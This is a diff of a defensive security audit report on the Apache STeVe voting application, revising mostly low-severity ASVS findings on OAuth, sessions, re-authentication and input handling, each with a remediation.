+Explicitly set response_mode for the code flow: asfquart.generics.OAUTH_URL_INIT = ('https://oauth.apache.org/auth?state=%s&redirect_uri=%s&response_type=code&response_mode=query'). Note: This is a Level 3 requirement. The ASF OAuth server should be configured to only allow appropriate response modes for this client. The finding reflects that no client-side enforcement or specification exists.
 
 ---
 
-#### FINDING-302: 🔵 Implicit Parameter Deduplication Without Explicit HPP Defense
+#### FINDING-225: Authorization code replay protection is delegated to external authorization server without client-side verification
 
 | Attribute | Value |
 |-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 15.3.7 |
-| Files | v3/server/pages.py:397 |
-| Source Reports | 15.3.7.md |
-| Related Findings | - | **Description:**
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L1, L2 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 10.4.2, 6.8.3 |
+| **Affected File(s)** | v3/server/main.py:41-42 |
+| **Source Report(s)** | 10.4.2.md, 6.8.3.md |
+| **Related Finding(s)** | None |
 
-HTTP form body (MultiDict with potential duplicate keys) is converted to edict() constructor which silently drops duplicates by keeping first value per key. When edict(await quart.request.form) is called, the MultiDict is converted to a regular dict, silently dropping duplicate parameters. The behavior depends on Werkzeug's MultiDict-to-dict conversion (typically keeps first value), but this is undocumented and implicit rather than explicit. While the framework naturally separates parameter sources (request.form vs request.args), there is no explicit defense against duplicate parameters within the same source. The implicit deduplication behavior is framework-version-dependent, making it fragile. However, the subsequent validation (if iid not in issue_dict) and the vote re-submission model (latest vote wins) significantly reduce impact.
+**Description:**
+
+This application is an OAuth CLIENT, not an authorization server. The enforcement of single-use authorization codes is the responsibility of the authorization server at oauth.apache.org. From the client side: 1. The code exchanges an authorization code for a token via the callback URL 2. The asfquart framework handles the actual token exchange 3. The authorization server should reject reused codes and revoke associated tokens. The code format 'https://oauth.apache.org/token?code=%s' passes the code as a query parameter in a GET-style URL format, which could lead to code exposure in server logs. If oauth.apache.org does not enforce single-use codes, an intercepted code could be replayed. This is outside the control of this codebase.
 
 **Remediation:**
 
-Implement explicit duplicate key detection: Check for duplicate vote keys using raw_form.getlist(key) and reject requests with duplicate parameters. Example: raw_form = await quart.request.form; for each key starting with 'vote-', extract iid and values = raw_form.getlist(key); if len(values) > 1, flash error message 'Duplicate vote parameter detected for issue {iid}' and redirect. This makes the deduplication behavior explicit and prevents framework-version-dependent behavior.
+Use POST for token exchange to avoid code in URL/logs. The token endpoint should accept code in the request body, not query string. Change from: asfquart.generics.OAUTH_URL_CALLBACK = 'https://oauth.apache.org/token?code=%s' to: asfquart.generics.OAUTH_URL_CALLBACK = 'https://oauth.apache.org/token' with code sent as POST body parameter.
 
 ---
 
-#### FINDING-303: 🔵 State-changing GET endpoints increase attack surface without documented protection
+#### FINDING-226: No Visible Refresh Token Expiration Enforcement on Client Side
 
 | Attribute | Value |
 |-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L1 |
-| CWE | - |
-| ASVS Section(s) | 6.1.1 |
-| Files | v3/server/pages.py:498-537 |
-| Source Reports | 6.1.1.md |
-| Related Findings | - | **Description:**
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 10.4.8, 10.5.5, 6.3.3 |
+| **Affected File(s)** | v3/server/pages.py:82-91 |
+| **Source Report(s)** | 10.4.8.md, 10.5.5.md, 6.3.3.md |
+| **Related Finding(s)** | None |
 
-State-changing operations using GET requests are trivially exploitable via link injection/prefetching. While not directly a rate-limiting issue, these endpoints compound the risk because automated tools (crawlers, prefetch mechanisms) can trigger state changes without the user's intent, and there's no documentation of how such automated abuse is prevented. Automated tools or cross-origin requests can trigger election state changes without rate limiting documentation.
+**Description:**
+
+The application uses asfquart.session and asfquart.auth for authentication, operating as an OIDC Relying Party (consuming authentication from ASF's identity infrastructure). However, there is no back-channel logout endpoint or logout token processing visible in the codebase. The application has no route matching /backchannel-logout, /logout, or similar patterns. No JWT parsing of logout tokens (checking typ header for logout+jwt), no verification of the event claim with member http://schemas.openid.net/event/backchannel-logout, no check for absence of nonce claim, no expiration validation on logout tokens. Sessions authenticated via asfquart.session.read() would persist indefinitely after an IdP-initiated logout. If the upstream identity provider (ASF's OIDC system) terminates a user's session, the voting application would continue to honor the stale session. This creates a denial-of-service vector through forced logout attacks, and sessions cannot be revoked remotely. A compromised account cannot be quickly invalidated across all relying parties.
 
 **Remediation:**
 
-Document that these endpoints are planned for migration to POST with CSRF protection, and implement reverse-proxy rate limiting in the interim.
+Implement a /backchannel-logout endpoint that: (1) Validates typ: logout+jwt in the JWT header, (2) Verifies the events claim contains http://schemas.openid.net/event/backchannel-logout, (3) Rejects tokens containing a nonce claim, (4) Enforces a maximum 2-minute token lifetime (exp - iat ≤ 120s), (5) Invalidates all sessions for the identified subject (sub) or session (sid). Additionally, implement session revocation infrastructure with a session store or blacklist mechanism, implement RP-initiated logout for user-facing logout, register the back-channel logout URI with the IdP, configure session timeouts aligned with IdP token lifetimes, and implement jti-based replay detection cache for logout tokens.
 
 ---
 
-#### FINDING-304: 🔵 No documented context-specific password deny list for the delegated authentication system
+#### FINDING-227: Cannot verify ID Token sub claim mapping to session uid
 
 | Attribute | Value |
 |-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 6.1.2 |
-| Files | v3/server/main.py:entire file, v3/server/pages.py:entire file |
-| Source Reports | 6.1.2.md |
-| Related Findings | - | **Description:**
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 10.5.2 |
+| **Affected File(s)** | v3/server/pages.py:82-90 |
+| **Source Report(s)** | 10.5.2.md |
+| **Related Finding(s)** | None |
 
-The application delegates password management entirely to ASF OAuth. However, ASVS 6.1.2 requires that a list of context-specific words be documented to prevent their use in passwords. For this application, such a list would include: Organization: "apache", "asf", "foundation"; Product: "steve", "voter", "election", "ballot"; System identifiers: Any election IDs, database names; Project codenames: "steve3", "STeVe"; Roles: "committer", "pmc", "member", "admin". Even though password enforcement is delegated, the documentation requirement still applies. The application should document either: 1. That ASF OAuth maintains such a deny list (with reference), OR 2. The recommended deny list for the ASF OAuth system to implement. Low severity because authentication is fully delegated to ASF OAuth, which likely has its own password policies. However, without documentation, there's no verification that context-specific words are prevented.
+**Description:**
+
+The application uses s['uid'] from the session as the unique user identifier throughout the codebase (for authorization checks, vote recording, election ownership, etc.). This maps to the LDAP uid attribute. The uid in ASF LDAP is a stable, non-reassignable identifier (Apache ID), which satisfies the spirit of the requirement. However, we cannot verify from the provided code: 1) That the session uid originates from a validated sub claim in an ID Token (the OAuth callback handler is in asfquart), 2) That the mapping between OAuth identity and LDAP uid is tamper-proof. The architectural pattern is sound — using a stable LDAP identifier — but verification of the token-to-session binding is not possible from the visible code.
 
 **Remediation:**
 
-Create documentation for context-specific password deny list:
-
-# Context-Specific Password Deny List
-
-## Delegation Notice
-Password policies are enforced by ASF OAuth (oauth.apache.org).
-The following context-specific words SHOULD be blocked by ASF's 
-password system:
-
-### Organization Names
-- apache, asf, foundation, software
-
-### Product/System Names  
-- steve, voter, voting, election, ballot
-
-### Role Names
-- committer, pmc, member, admin, owner
-
-### Project Identifiers
-- steve3, STeVe, apache-steve
-
-## Verification
-[Link to ASF password policy documentation]
-[Date last verified: YYYY-MM-DD]
+Verify that the asfquart framework properly validates the ID Token and maps the sub claim to the session uid. Audit the asfquart library OAuth callback handler to ensure: 1) The sub claim from the ID Token is extracted after proper token validation, 2) The mapping between OAuth sub claim and LDAP uid is secure and tamper-proof, 3) The session uid cannot be manipulated by the client. Document this mapping and validation process.
 
 ---
 
-#### FINDING-305: 🔵 State-changing operations exposed via GET method (session replay risk)
+#### FINDING-228: No documented context-specific password deny list for the delegated authentication system
 
 | Attribute | Value |
 |-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L1 |
-| CWE | - |
-| ASVS Section(s) | 6.3.1 |
-| Files | v3/server/pages.py:do_open_endpoint, v3/server/pages.py:do_close_endpoint |
-| Source Reports | 6.3.1.md |
-| Related Findings | - | **Description:**
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 6.1.2 |
+| **Affected File(s)** | v3/server/main.py, v3/server/pages.py |
+| **Source Report(s)** | 6.1.2.md |
+| **Related Finding(s)** | None |
 
-State-changing endpoints /do-open/&lt;eid&gt; and /do-close/&lt;eid&gt; use HTTP GET method instead of POST. GET requests for state-changing operations can be cached/logged by proxies and browsers, triggered via &lt;img&gt; tags or link prefetching, and replayed from browser history. While primarily a CSRF concern, it also reduces the effectiveness of brute force protection since GET requests are easier to automate and may bypass POST-specific protections in WAFs.
+**Description:**
+
+The application delegates password management entirely to ASF OAuth. However, ASVS 6.1.2 requires that a list of context-specific words be documented to prevent their use in passwords. For this application, such a list would include: Organization: "apache", "asf", "foundation"; Product: "steve", "voter", "election", "ballot"; System identifiers: Any election IDs, database names; Project codenames: "steve3", "STeVe"; Roles: "committer", "pmc", "member", "admin". Even though password enforcement is delegated, the documentation requirement still applies. The application should document either: 1. That ASF OAuth maintains such a deny list (with reference), OR 2. The recommended deny list for the ASF OAuth system to implement. Impact: Low severity because authentication is fully delegated to ASF OAuth, which likely has its own password policies. However, without documentation, there's no verification that context-specific words are prevented.
 
 **Remediation:**
 
-Change state-changing endpoints from GET to POST method. Example: @APP.post('/do-open/&lt;eid&gt;') instead of @APP.get('/do-open/&lt;eid&gt;'). This aligns with HTTP semantics and reduces accidental/automated triggering risks.
+Create documentation for context-specific password deny list including organization names (apache, asf, foundation, software), product/system names (steve, voter, voting, election, ballot), role names (committer, pmc, member, admin, owner), and project identifiers (steve3, STeVe, apache-steve). Document delegation notice that password policies are enforced by ASF OAuth with link to ASF password policy documentation and date last verified.
 
 ---
 
-#### FINDING-306: 🔵 OAuth state parameter binding not verifiable in reviewed code
+#### FINDING-229: LDAP bulk import does not filter or flag privileged/default account names
 
 | Attribute | Value |
 |-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 6.6.2 |
-| Files | v3/server/main.py:33-37 |
-| Source Reports | 6.6.2.md |
-| Related Findings | - | **Description:**
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L1 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 6.3.2 |
+| **Affected File(s)** | v3/server/bin/asf-load-ldap.py:46-57 |
+| **Source Report(s)** | 6.3.2.md |
+| **Related Finding(s)** | None |
 
-The state parameter in the OAuth flow serves to bind the authentication callback to the original request (analogous to OOB binding). However, the state generation and validation logic resides within the asfquart framework (not provided for review). The %s format string suggests the state is injected but we cannot verify: 1. Whether the state contains sufficient entropy, 2. Whether it's bound to the user's session, 3. Whether it's validated on callback. If the asfquart framework does not properly validate the OAuth state parameter, authentication responses could be replayed or misbound. However, this is a framework-level concern rather than application-level.
+**Description:**
+
+The LDAP search filter `uid=*` imports every LDAP entry without filtering. If the ASF LDAP directory contains service accounts, test accounts, or accounts with default-like names (e.g., `root`, `admin`, `test`), they would be imported into the person database and potentially eligible for election participation. The application does not validate imported accounts against a blocklist of default/service account names. This is a low severity finding because: 1) ASF LDAP is the authoritative source and likely manages its own account hygiene, 2) The imported accounts still need to pass `mayvote` authorization checks before voting, 3) No evidence that ASF LDAP contains standard default accounts like 'root' or 'sa'.
 
 **Remediation:**
 
-Document reliance on asfquart framework for OAuth state binding. Verify during integration testing that: 1. State is generated with CSPRNG (≥128 bits), 2. State is stored in server-side session before redirect, 3. State is verified on callback and consumed (single-use)
+Add filtering for known service/default accounts: BLOCKED_UIDS = {'root', 'admin', 'sa', 'test', 'nobody', 'daemon'}. During LDAP import, skip any uid that matches the blocklist and log a warning.
 
 ---
 
-#### FINDING-307: 🔵 TLS certificate storage lacks explicit integrity protection mechanisms
+#### FINDING-230: No re-authentication for sensitive election management operations
 
 | Attribute | Value |
 |-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | - |
-| ASVS Section(s) | 6.7.1 |
-| Files | v3/server/main.py:6, v3/server/main.py:71-73 |
-| Source Reports | 6.7.1.md |
-| Related Findings | - | **Description:**
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 6.3.3 |
+| **Affected File(s)** | v3/server/pages.py:484-520 |
+| **Source Report(s)** | 6.3.3.md |
+| **Related Finding(s)** | None |
 
-While this requirement specifically targets certificates used for cryptographic authentication assertions (FIDO/smart cards) rather than TLS server certificates, the TLS certificates are stored on the filesystem at a path relative to the application directory. There is no evidence of: 1. File permission enforcement 2. Integrity verification (checksums/signatures) before loading 3. Read-only filesystem mounting. If an attacker gains filesystem write access to the certs/ directory, they could replace the TLS certificate/key pair, enabling MITM attacks. However, this requires prior server compromise and is noted as an observation rather than a critical finding. This is primarily an infrastructure/deployment concern. The ASVS requirement is about cryptographic authentication assertion certificates, which are not implemented in this application.
+**Description:**
+
+Critical operations like opening and closing elections have no step-up authentication or re-authentication requirement. With single-factor auth as the only mechanism, these high-impact operations proceed with the same assurance level as viewing a profile page. If a session is hijacked, the attacker can perform irreversible election management actions (open/close elections) without additional verification.
 
 **Remediation:**
 
-For defense-in-depth:
-
-import os
-import stat
-
-# Verify certificate file permissions before loading
-cert_path = CERTS_DIR / app.cfg.server.certfile
-cert_stat = os.stat(cert_path)
-if cert_stat.st_mode & (stat.S_IWGRP | stat.S_IWOTH):
-    raise RuntimeError(f"Certificate file {cert_path} has unsafe permissions")
+Implement a re-authentication prompt before critical operations with require_recent_auth(max_age_seconds=300) that checks session.last_auth_at and redirects to /reauth if the session is too old.
 
 ---
 
-#### FINDING-308: 🔵 Session Token Storage Mechanism Not Defined
+#### FINDING-231: PersonDB Lookup Reveals User Existence to Authenticated Users
 
 | Attribute | Value |
 |-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 14.3.3 |
-| Files | Entire provided codebase |
-| Source Reports | 14.3.3.md |
-| Related Findings | - | **Description:**
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L3 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 6.3.8 |
+| **Affected File(s)** | v3/server/pages.py:303-344 |
+| **Source Report(s)** | 6.3.8.md |
+| **Related Finding(s)** | None |
 
-Per ASVS 14.3.3, session tokens are the only exception allowed for browser storage. However, no session management mechanism is visible in the provided code. The domain context mentions the application uses Quart (async Flask-like framework), which typically uses signed cookies for sessions. Without seeing the session configuration, it's unclear whether session cookies are marked HttpOnly, Secure, and SameSite, or whether session data beyond the token ID is stored client-side. Session management not visible in provided code. This is likely handled by the Quart framework's session management, but cannot be verified from the provided files.
+**Description:**
+
+When an authenticated committer accesses `/admin` and is NOT found in the PersonDB, they receive a distinct `T_BAD_PID` 404 error page. This differentiates between "user exists in PersonDB" vs. "user doesn't exist in PersonDB." However, this only reveals information to the authenticated user about their OWN account status, the user is already authenticated via OAuth (so their identity is known), and no endpoint allows querying OTHER users' existence. Impact is minimal as the information leak is about the user's own status in an internal database, visible only to authenticated users. This does not enable enumeration of other users' accounts.
 
 **Remediation:**
 
-Ensure Quart session configuration includes: app.config['SESSION_COOKIE_HTTPONLY'] = True, app.config['SESSION_COOKIE_SECURE'] = True, app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'.
+While the impact is minimal due to mitigating factors (authentication is external via ASF OAuth, no login form exists to enumerate against, no registration or forgot-password functionality exists, and the differentiated response is only visible to the authenticated user about themselves), consider returning a generic error message that does not differentiate between user existence states in PersonDB.
 
 ---
 
-#### FINDING-309: 🔵 Deserialized JSON `kv` data lacks schema validation before use in vote tallying
+#### FINDING-232: No session/token expiration renewal notifications
 
 | Attribute | Value |
 |-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 1.5.2 |
-| Files | v3/steve/election.py:292, v3/steve/election.py:368 |
-| Source Reports | 1.5.2.md |
-| Related Findings | - | **Description:**
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L3 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 6.4.5 |
+| **Affected File(s)** | v3/server/pages.py:63-93 |
+| **Source Report(s)** | 6.4.5.md |
+| **Related Finding(s)** | None |
+
+**Description:**
+
+While authentication mechanism expiry (passwords, certificates, tokens) is managed by the external ASF IdP, the application's own session mechanism does not appear to implement any renewal warning. If sessions have a fixed lifetime (configured in the `asfquart` framework), users receive no advance notice before their session expires during an active voting period. Session expiration occurs without warning, and users discover expired sessions only upon their next action. During time-sensitive elections, a voter or administrator could lose their session mid-operation without advance warning.
+
+**Remediation:**
+
+If session timeouts are enforced, consider implementing a client-side warning (e.g., JavaScript timer) or server-side check that alerts users when their session is approaching expiration, particularly during active voting operations.
+
+---
+
+#### FINDING-233: Non-cryptographic random module used for candidate shuffling
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 6.5.3 |
+| **Affected File(s)** | v3/server/pages.py:33, v3/server/pages.py:290 |
+| **Source Report(s)** | 6.5.3.md |
+| **Related Finding(s)** | None |
+
+**Description:**
+
+The `random` module (non-CSPRNG) is imported and used for shuffling candidate display order. While this is NOT generating lookup secrets, OOB codes, or TOTP seeds (and therefore not a direct violation of 6.5.3), it establishes a pattern of using non-cryptographic randomness. If this module were ever extended to generate authentication-related secrets, the existing `import random` would likely be mistakenly reused. The Mersenne Twister's state can be reconstructed from 624 consecutive outputs, theoretically allowing prediction of shuffle order — but this only affects candidate display bias, not authentication security.
+
+**Remediation:**
+
+Replace `random` module usage with `secrets` or `random.SystemRandom()` for shuffling operations. While not an authentication vulnerability, using cryptographically secure randomness for candidate shuffling prevents any potential bias exploitation and establishes better security patterns.
+
+---
+
+#### FINDING-234: No re-authentication requirement for sensitive election management operations (federated context)
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 7.1.3 |
+| **Affected File(s)** | v3/server/pages.py:484-520 |
+| **Source Report(s)** | 7.1.3.md |
+| **Related Finding(s)** | None |
+
+**Description:**
+
+Sensitive operations such as opening elections (do_open_endpoint) and closing elections (do_close_endpoint) do not require re-authentication. In a federated identity system, re-authentication for high-privilege operations ensures the current operator is still the authenticated principal. A stolen session token could be used to open or close elections without any step-up authentication challenge.
+
+**Remediation:**
+
+Implement re-authentication requirement for sensitive operations (election open/close/create) as a step-up authentication mechanism.
+
+---
+
+#### FINDING-235: Session token generation cannot be verified from provided code — delegated to asfquart framework
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L1 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 7.2.3 |
+| **Affected File(s)** | v3/server/pages.py:82, v3/server/main.py:45 |
+| **Source Report(s)** | 7.2.3.md |
+| **Related Finding(s)** | None |
+
+**Description:**
+
+Session token generation is fully delegated to the `asfquart` framework, which is not included in the audited codebase. It is not possible to verify from the provided source files whether session tokens meet the 128-bit entropy requirement or are generated using a CSPRNG. The `asfquart.session` module handles all token creation internally. If the framework uses insufficient entropy (e.g., predictable tokens, < 128 bits), session tokens could be brute-forced or predicted, leading to session hijacking in the voting system.
+
+**Remediation:**
+
+Verify the `asfquart` framework's session token generation: 1. Audit `asfquart.session` module for CSPRNG usage (e.g., `secrets.token_hex(16)` or equivalent) 2. Verify token length provides ≥ 128 bits of entropy 3. Document the verification in security architecture documentation.
+
+---
+
+#### FINDING-236: No logout functionality visible in audited code
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L1 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 7.2.4 |
+| **Affected File(s)** | v3/server/pages.py |
+| **Source Report(s)** | 7.2.4.md |
+| **Related Finding(s)** | None |
+
+**Description:**
+
+The provided `pages.py` file defines no logout endpoint or session termination route. While this may exist in the `asfquart` framework or in the imported but not provided `api.py` module, the absence means we cannot verify that session tokens are properly terminated on logout. The file defines routes for `/`, `/voter`, `/admin`, `/manage/<eid>`, `/profile`, `/settings`, `/about`, and various `/do-*` action endpoints, but no `/logout` or `/do-logout` endpoint.
+
+**Remediation:**
+
+Implement or verify logout functionality that terminates the session token server-side. Add explicit logout endpoint (e.g., /logout or /do-logout) that destroys the session and invalidates the session token to prevent session theft after logout.
+
+---
+
+#### FINDING-237: OAuth callback session creation handler not visible for verification
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 7.6.2 |
+| **Affected File(s)** | v3/server/main.py:39-42 |
+| **Source Report(s)** | 7.6.2.md |
+| **Related Finding(s)** | None |
+
+**Description:**
+
+The OAuth flow configuration is present, but the actual callback handler that creates the session is not visible in the audited code (it's likely in the `asfquart` framework). The OAuth flow inherently requires user interaction (browser redirect to OAuth provider, user approves). However, without seeing the callback handler, it's impossible to verify that: 1. Silent re-authentication doesn't create new sessions without user interaction 2. The callback validates that the user actively initiated the flow (state parameter). If the `asfquart` framework's OAuth callback creates sessions without proper state validation, it could be possible to forge session creation. However, the `state=%s` parameter in the OAuth URL suggests state parameter usage, which is a positive indicator.
+
+**Remediation:**
+
+Audit the `asfquart` framework OAuth callback handler to verify: 1. State parameter is properly validated to prevent CSRF attacks and ensure user-initiated flow 2. Silent re-authentication does not create new sessions without explicit user interaction 3. Callback validates that the user actively initiated the OAuth flow. Document the session creation logic and ensure it aligns with ASVS 7.6.2 requirements.
+
+---
+
+#### FINDING-238: Election state changes are immediately effective but no notification mechanism exists
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L3 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 8.3.2 |
+| **Affected File(s)** | v3/steve/election.py |
+| **Source Report(s)** | 8.3.2.md |
+| **Related Finding(s)** | None |
+
+**Description:**
+
+When an election is closed, any voter with the voting page already loaded can still submit their form, which will fail with a state error. The authorization change (election closed = no more voting) IS applied immediately in the database (add_vote checks self.S_OPEN), but there's no mitigating control to alert voters mid-session. This is partially mitigated by _all_metadata(self.S_OPEN) in add_vote which validates state on every vote submission.
+
+**Remediation:**
+
+Implement a real-time notification mechanism to alert active voters when an election state changes (e.g., when an election closes). Consider using WebSockets or polling to notify users that voting is no longer possible.
+
+---
+
+#### FINDING-239: No evidence of token propagation architecture, but session identity is correctly used for all operations
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L3 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 8.3.3 |
+| **Affected File(s)** | v3/server/pages.py, v3/steve/election.py |
+| **Source Report(s)** | 8.3.3.md |
+| **Related Finding(s)** | None |
+
+**Description:**
+
+The application is a monolithic server with direct database access. There are no service-to-service calls, no intermediary services, and no token forwarding patterns. All operations use result.uid (from the authenticated session) directly. No findings detected for this requirement in the current architecture. The application correctly uses the originating subject's identity for all permission decisions.
+
+**Remediation:**
+
+No remediation required. The application correctly uses the originating subject's identity for all permission decisions. Continue to maintain this pattern as the architecture evolves.
+
+---
+
+#### FINDING-240: User-controlled values in flash messages and log entries via f-strings
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 1.3.10 |
+| **Affected File(s)** | v3/server/pages.py:423, v3/server/pages.py:490, v3/server/pages.py:399 |
+| **Source Report(s)** | 1.3.10.md |
+| **Related Finding(s)** | None |
+
+**Description:**
+
+User-controlled values are included in flash messages and log entries via f-strings. While f-strings themselves are safe from format string attacks, the user data (election titles, issue IDs) flows into contexts that could be misinterpreted in future refactoring. Data flow: User form input (form.title, iid from form keys) → f-string evaluation → flash message stored in session → rendered in template. Impact is minimal for format string attacks specifically (f-strings prevent this). The concern is defensive: if logging or flash code were refactored to use deferred formatting (e.g., logging.info with %s or Python's .format() on a template variable), the lack of explicit sanitization could introduce vulnerabilities. Current code is safe.
+
+**Remediation:**
+
+No immediate action needed. Document as secure-by-convention and add input validation (length limits, character restrictions) for election titles as defense-in-depth.
+
+---
+
+#### FINDING-241: SVG files served without script execution prevention
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 1.3.4 |
+| **Affected File(s)** | v3/server/pages.py:586 |
+| **Source Report(s)** | 1.3.4.md |
+| **Related Finding(s)** | None |
+
+**Description:**
+
+The serve_doc endpoint serves arbitrary files from the docs directory without file-type restrictions. If SVG files are placed in the docs directory (by trusted administrators), they would be served with their native image/svg+xml Content-Type, potentially containing embedded scripts. If a compromised or malicious election administrator places an SVG file with embedded JavaScript, it would be served to voters who click links generated by rewrite_description(). Mitigating factors include: files are placed by trusted administrators (filesystem access required), not directly uploadable through the web interface, and the user writing doc:filename in a description cannot create the actual file.
+
+**Remediation:**
+
+Add Content-Disposition header to force download for non-safe types. Create a SAFE_INLINE_TYPES allowlist containing only safe extensions like .pdf, .txt, .png, .jpg, .jpeg, .gif. For files not in the allowlist, set Content-Disposition to attachment. Additionally, add Content-Security-Policy header with script-src 'none' to prevent SVG script execution even if served inline.
+
+---
+
+#### FINDING-242: Deserialized JSON `kv` data lacks schema validation before use in vote tallying
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 1.5.2 |
+| **Affected File(s)** | v3/steve/election.py:292, v3/steve/election.py:368 |
+| **Source Report(s)** | 1.5.2.md |
+| **Related Finding(s)** | None |
+
+**Description:**
 
 Database `issue.kv` column (TEXT) is deserialized via `json.loads()` and passed directly to `vtypes` module `tally()` function without structural validation. While `json.loads()` is inherently safe from code execution (only produces basic Python types: dict, list, str, int, float, bool, None), the deserialized structure is passed to vote-type-specific modules without validation against an expected schema. If the `kv` data were corrupted or maliciously set (e.g., via an authorization bypass — the code inventory notes multiple `### check authz` placeholders are unimplemented), unexpected data structures could cause logic errors in tallying. Mitigating factors include: data originates from authorized election administrators (write path is `add_issue`/`edit_issue` which assert `is_editable()`), `json.loads()` cannot instantiate arbitrary objects, `issue.type` is validated against `vtypes.TYPES` at creation time, and risk is LOW because exploitation requires bypassing multiple controls.
 
 **Remediation:**
 
-Implement schema validation in the `json2kv()` method to ensure the parsed result is a dict (expected schema) and raise ValueError if not. Additionally, each `vtypes` module should validate the `kv` structure it receives in its `tally()` function. Example code:
+Add schema validation to the `json2kv()` function to ensure the deserialized result is a dict (expected schema). Additionally, each `vtypes` module should validate the `kv` structure it receives in its `tally()` function. Example implementation:
 ```python
 @staticmethod
 def json2kv(j):
@@ -6490,23 +5682,987 @@ def json2kv(j):
 
 ---
 
-#### FINDING-310: 🔵 Cannot Verify SRI Compliance - Templates Not Available for Audit
+#### FINDING-243: Vote type enumeration not documented outside of code
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L1 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 2.1.1 |
+| **Affected File(s)** | v3/docs/schema.md |
+| **Source Report(s)** | 2.1.1.md |
+| **Related Finding(s)** | None |
+
+**Description:**
+
+The schema documentation mentions yna and stv as vote types but does not document the complete set of valid values, how they are validated, or their expected input/output formats. The schema.md states that type column supports yna (Yes/No/Abstain voting) and stv (Single Transferable Vote) with additional types potentially added in the future, but the validation rules for each type's vote data are not documented. The enumeration exists partially in documentation and is enforced in code (vtypes.TYPES), but the validation rules for each type's vote input format are not documented.
+
+**Remediation:**
+
+Document the expected vote input format for each type and the validation rules that apply. Include complete enumeration of valid vote types, input format specifications, and validation criteria for each type's vote data.
+
+---
+
+#### FINDING-244: Server can operate without TLS with no documentation or warning
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L3 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 3.1.1 |
+| **Affected File(s)** | v3/server/main.py:53-90 |
+| **Source Report(s)** | 3.1.1.md |
+| **Related Finding(s)** | None |
+
+**Description:**
+
+The server can be configured without TLS (blank certfile/keyfile fields in config.yaml), serving plain HTTP with no documentation stating this is only acceptable for development. The application silently falls back to plain HTTP if TLS is not configured, with no warning or documentation about security implications.
+
+**Remediation:**
+
+Add explicit warning logging when TLS is not configured, and document that production deployments MUST use TLS (either directly or via reverse proxy).
+
+---
+
+#### FINDING-245: Global Scope Functions Without Namespace Isolation or Type Checking
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L3 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 3.2.3 |
+| **Affected File(s)** | v3/server/templates/admin.ezt |
+| **Source Report(s)** | 3.2.3.md |
+| **Related Finding(s)** | None |
+
+**Description:**
+
+Functions are defined in global scope without namespace isolation in `admin.ezt`. The `showModal`, `validateRequiredField`, and `submitFormWithLoading` functions (presumably from `steve.js`) are also global. No strict type checking is performed on DOM element retrieval results. Low risk since this page requires admin authentication and doesn't render user-controlled HTML. However, it represents a pattern that could become exploitable if combined with other vulnerabilities.
+
+**Remediation:**
+
